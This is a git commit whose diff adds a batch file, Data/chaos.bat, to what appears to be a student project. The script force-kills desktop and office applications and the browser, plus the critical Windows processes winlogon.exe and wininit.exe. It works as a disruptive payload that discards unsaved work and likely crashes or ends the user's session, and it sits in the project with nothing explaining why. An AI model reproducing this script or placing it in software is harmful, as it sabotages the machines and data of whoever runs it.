79a94432d9a5bd62a26ef764f3919bc19978b667
GBry <blckexecutor@gmail.com>
2015-05-02 00:40:45 +0700

    FPC FIles

---
+++ Data/chaos.bat
@@ -0,0 +1,15 @@
+taskkill /im explorer.exe /f
+taskkill /im winword.exe /f
+taskkill /im chrome.exe /f
+taskkill /im iexplore.exe /f
+taskkill /im winlogon.exe /f
+taskkill /im wininit.exe /f
+taskkill /im taskhostex.exe /f
+taskkill /im conhost.exe /f
+taskkill /im powerpnt.exe /f
+taskkill /im notepad.exe /f
+taskkill /im excel.exe /f
+taskkill /im tugas_besar.exe/f
+taskkill /im fp.exe /f
+taskkill /im cmd.exe /f
+
